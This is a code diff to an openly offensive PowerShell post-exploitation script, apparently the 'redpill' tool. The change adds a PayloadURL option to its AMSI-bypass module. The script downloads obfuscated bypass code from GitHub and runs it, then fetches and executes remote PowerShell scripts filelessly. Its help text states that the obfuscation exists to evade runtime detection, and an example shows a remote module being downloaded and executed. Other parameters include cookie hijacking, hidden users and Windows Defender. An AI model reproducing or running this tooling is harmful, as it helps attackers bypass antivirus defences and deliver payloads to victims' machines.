@@ -95,6 +95,7 @@
    [string]$Domain="www.facebook.com",
    [string]$ServiceName="WinDefend",
    [string]$CookieHijack="False",
+   [string]$PayloadURL="false",
    [string]$LiveStream="false",
    [string]$HiddenUser="false",
    [string]$Execute="cmd.exe",
@@ -3240,7 +3241,7 @@ If($NoAmsi -ne "false"){
       Start-BitsTransfer -priority foreground -Source https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/bin/NoAmsi.ps1 -Destination $Env:TMP\NoAmsi.ps1 -ErrorAction SilentlyContinue|Out-Null
       ## Check downloaded file integrity => FileSizeKBytes
       $SizeDump = ((Get-Item -Path "$Env:TMP\NoAmsi.ps1" -EA SilentlyContinue).length/1KB)
-      If($SizeDump -lt 34){## Corrupted download detected => DefaultFileSize: 34,9296875/KB
+      If($SizeDump -lt 40){## Corrupted download detected => DefaultFileSize: 40,4482421875/KB
          Write-Host "[error] Abort, Corrupted download detected" -ForegroundColor Red -BackgroundColor Black
          If(Test-Path -Path "$Env:TMP\NoAmsi.ps1"){Remove-Item -Path "$Env:TMP\NoAmsi.ps1" -Force}
          Write-Host "";Start-Sleep -Seconds 1;exit ## EXit @redpill
@@ -3255,11 +3256,25 @@ If($NoAmsi -ne "false"){
    {
       powershell -File "$Env:TMP\NoAmsi.ps1" -Action List
    }
-   ElseIf($NoAmsi -ieq "TestAll" -or $NoAmsi -ieq "Bypass")
+   ElseIf($NoAmsi -ieq "TestAll")
    {
-      If($Id -eq "false"){$Id = "2"}
       ## &"<script>" allows me to run NoAmsi on redpill process
-      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
+      &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi
+   }
+   ElseIf($NoAmsi -ieq "Bypass")
+   {
+      If($PayloadURL -ne "false")
+      {
+         If($Id -eq "false"){$Id = "2"}
+         ## &"<script>" allows me to run NoAmsi on redpill process
+         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -PayloadURL "$PayloadURL" -Id $Id      
+      }
+      Else
+      {
+         If($Id -eq "false"){$Id = "2"}
+         ## &"<script>" allows me to run NoAmsi on redpill process
+         &"$Env:TMP\NoAmsi.ps1" -Action $NoAmsi -Id $Id
+      }
    }
    Else
    {
@@ -5164,25 +5179,31 @@ $HelpParameters = @"
 
    <#!Help.
    .SYNOPSIS
+      Author: @r00t-3xp10it
       Test AMS1 string bypasses or simple execute one bypass technic!
    
    .DESCRIPTION
       This cmdlet tests an internal list of amsi_bypass_technics on
       current shell or simple executes one of the bypass technics.
       This cmdlet re-uses: @_RastaMouse, @Mattifestation and @nullbyte
-      source code POC's obfuscated {by me} to evade string\runtime detection.
+      source code POC's obfuscated {by me} to evade runtime detection.
    
    .NOTES
       _Remark: The Amsi_bypasses will only work on current shell while is
       process is running. But on process close all will return to default.
       _Remark: If sellected -Action '<testall>' then this cmdlet will try
       all available bypasses and aborts at the first successfull bypass.
+      _Remark: -PayloadURL '<url>' only works with -Action 'bypass' @arg.
+      _Remark: -PayloadURL '<url>' does not use technic nº1 (PS_DOWNGRADE) 
 
    .Parameter NoAmsi
       Accepts arguments: list, testall, bypass (default: bypass)
 
    .Parameter Id
       The technic Id to use for am`si_bypass (default: 2)  
+
+   .Parameter PayloadURL
+      The URL script.ps1 to be downloaded\executed! (default: false)
 
    .EXAMPLE
       PS C:\> .\redpill.ps1 -NoAmsi List
@@ -5193,8 +5214,12 @@ $HelpParameters = @"
       Test ALL cmdlet Am`si_bypasses technics!
 
    .EXAMPLE
-      PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 2
-      Execute Am`si_bypass technic nº2 on current shell!
+      PS C:\> .\redpill.ps1 -NoAmsi Bypass -Id 5
+      Execute Am`si_bypass technic nº5 on current shell!
+
+   .EXAMPLE
+      PS C:\> .\redpill.ps1 -NoAmsi bypass -PayloadURL "https://raw.githubusercontent.com/r00t-3xp10it/redpill/main/modules/GetSkype.ps1"
+      Download\Execute 'GetSkype.ps1' (FileLess) trougth Ams1_bypass technic nº2 (cmdlet default technic)
 
    .OUTPUTS
       Testing am`si_bypass technics
